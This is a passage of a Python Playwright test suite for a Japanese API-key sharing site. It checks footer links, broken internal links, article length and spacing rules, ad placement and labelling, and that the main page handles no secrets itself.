    assert (int.from_bytes(png[16:20], "big"), int.from_bytes(png[20:24], "big")) == (1200, 630), "og.png is not 1200x630"
    assert len(png) < 200_000, len(png)
    world, ctx, page = await open_world(browser, server, as_shipped=True)
    for start in ["/", "/open"]:
        for link, heading in [("プライバシー", "プライバシーポリシー"), ("利用規約", "利用規約"), ("通報", "悪用の通報")]:
            await page.goto("https://apikeybin.com" + start, wait_until="domcontentloaded")
            assert await page.locator("footer a").count() == 5, page.url
            assert await page.locator("footer a", has_text="GitHub").get_attribute("href") == source, page.url
            await press(page, page.locator("footer").get_by_text(link, exact=True))
            await page.locator("h1", has_text=heading).wait_for(state="visible", timeout=20000)
            assert await page.locator("footer a").count() == 5, page.url
            assert await page.locator("footer a", has_text="GitHub").get_attribute("href") == source, page.url
    await ctx.close()
    # On the narrowest phones (280px) a footer link moves to the next line whole; it is never cut in two.
    world, ctx, page = await open_world(browser, server, as_shipped=True, context={"viewport": {"width": 280, "height": 653}})
    for path in ["/", "/open", "/guides/how-it-works"]:
        await page.goto("https://apikeybin.com" + path, wait_until="domcontentloaded")
        rects = await page.locator("footer a").evaluate_all("links => links.map(a => a.getClientRects().length)")
        assert rects == [1, 1, 1, 1, 1], (path, rects)
    await ctx.close()


def site_pages():
    return sorted(SITE.rglob("*.html"))


async def s_every_link_inside_the_site_leads_somewhere(browser, server):
    # AdSense lists "broken links" among navigation problems.
    seen = 0
    for path in site_pages():
        for href in re.findall(r'href="(/[^"#]*)', path.read_text()):
            seen += 1
            if href == "/" or href.endswith((".css", ".svg")):
                target = SITE / (href.lstrip("/") or "index.html")
            elif href.endswith("/"):
                target = SITE / href.lstrip("/") / "index.html"
            else:
                target = SITE / (href.lstrip("/") + ".html")
            assert target.exists(), (path.name, href)
    assert seen > 40, seen


async def s_the_articles_say_something_and_are_written_to_the_rules(browser, server):
    japanese = "ぁ-んァ-ヶー一-龠々"
    for path in sorted((SITE / "guides").glob("*.html")):
        html = path.read_text()
        assert html.count("<h1>") == 1, path.name
        assert '<meta name="description" content="' in html, path.name
        assert 'class="no-ads"' in html, path.name
        if path.name == "index.html":
            continue
        assert "内容の確認日" in html, path.name
        assert 'href="/"' in html, (path.name, "no way to the tool")
        body = html[html.index("<article"):html.index("</article>")]
        text = re.sub(r"<[^>]+>", "", re.sub(r"<pre>.*?</pre>", "", body, flags=re.S))
        assert len(text) > 1500, (path.name, len(text))
        # Within one run of text: no space between Japanese and Latin letters or digits.
        for run in re.split(r"<[^>]+>", re.sub(r"<pre>.*?</pre>", "", body, flags=re.S)):
            found = re.search(rf"[A-Za-z0-9%] [{japanese}]|[{japanese}] [A-Za-z0-9]", run)
            assert not found, (path.name, run[max(0, found.start() - 10):found.end() + 10])


async def s_ads_keep_their_distance_in_the_articles_too(browser, server):
    for path in sorted((SITE / "guides").glob("*.html")):
        if path.name == "index.html":
            continue
        for width, height, limit in [(390, 844, 0.30), (1200, 800, 0.50)]:
            world, ctx, page = await open_world(browser, server, context={"viewport": {"width": width, "height": height}})
            await page.goto(f"https://apikeybin.com/guides/{path.stem}", wait_until="domcontentloaded")
            ads = await visible_boxes(page.locator(".ad-box"))
            buttons = await visible_boxes(page.locator("a.button"))
            total = await page.evaluate("document.documentElement.scrollHeight")
            assert ads and buttons, path.name
            assert sum(a["height"] for a in ads) / total <= limit, (path.name, width)
            overflow = await page.evaluate("document.documentElement.scrollWidth - innerWidth")
            assert overflow <= 0, (path.name, width, overflow)
            for b in buttons:
                for a in ads:
                    assert distance(a, b) >= 150, (path.name, width, round(distance(a, b)))
            await ctx.close()


async def s_only_someone_who_came_from_a_link_is_shown_the_way_to_the_reading_page(browser, server):
    # AdSense: "Linking to content that doesn't exist". Anyone else who lands on the page has nothing
    # waiting for them on the reading page.
    world, ctx, page = await open_world(browser, server)
    await page.goto("https://apikeybin.com/open", wait_until="domcontentloaded")
    assert await page.locator("a.button").count() == 2
    assert await visible_boxes(page.locator("a.button")) == [], "a button to nowhere"
    assert await page.locator(".without-link").is_visible()
    assert await page.locator("h1").is_visible() and await page.locator("section").first.is_visible()
    await ctx.close()
    world, ctx, page = await open_world(browser, server)
    await page.goto("https://apikeybin.com/open#go", wait_until="domcontentloaded")
    assert len(await visible_boxes(page.locator("a.button"))) == 2, "the reader has no way on"
    assert not await page.locator(".without-link").is_visible()
    await ctx.close()


async def s_the_site_itself_never_handles_a_secret(browser, server):
    html = (SITE / "index.html").read_text()
    for marker in ["<textarea", "<input", "<form", "<script"]:
        assert marker not in html, marker
    assert not re.search(r"<[^>]+\son\w+=", html), "an inline handler"
    assert 'src="https://app.apikeybin.com/embed"' in html
    # The ads must be labelled, and must not sit in the reading pages.
    assert html.count('class="ad-label">広告<') >= 2
    for name in ["s.html", "embed.html", "index.html"]:
        page = (ROOT / "web/public" / name).read_text()
        for word in ["adsbygoogle", "googlesyndication", "doubleclick"]:
            assert word not in page, (name, word)


async def main():
    engines = (os.environ.get("BROWSERS") or "chromium,webkit,firefox").split(",")
    tests = [v for k, v in sorted(globals().items()) if k.startswith("s_")]
    passed, failed, skipped = 0, [], []
    with Server() as server:
        async with async_playwright() as pw:
            for name in engines:
                browser = await getattr(pw, name).launch(headless=True)
                print(f"== {name} {browser.version}", flush=True)
                for fn in tests:
                    try:
                        await asyncio.wait_for(fn(browser, server), timeout=150)
                        passed += 1
                        print(f"ok   {fn.__name__}", flush=True)
                    except Skip as e:
                        skipped.append(f"{name}:{fn.__name__}")
                        print(f"skip {fn.__name__}: {e}", flush=True)
                    except Exception as e:  # noqa: BLE001
                        failed.append(f"{name}:{fn.__name__}")
                        print(f"FAIL {fn.__name__}: {type(e).__name__}: {str(e)[:400]}", flush=True)
                await browser.close()
    print(f"\nshell: {passed} passed, {len(failed)} failed {failed}, {len(skipped)} not tested {skipped}", flush=True)
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
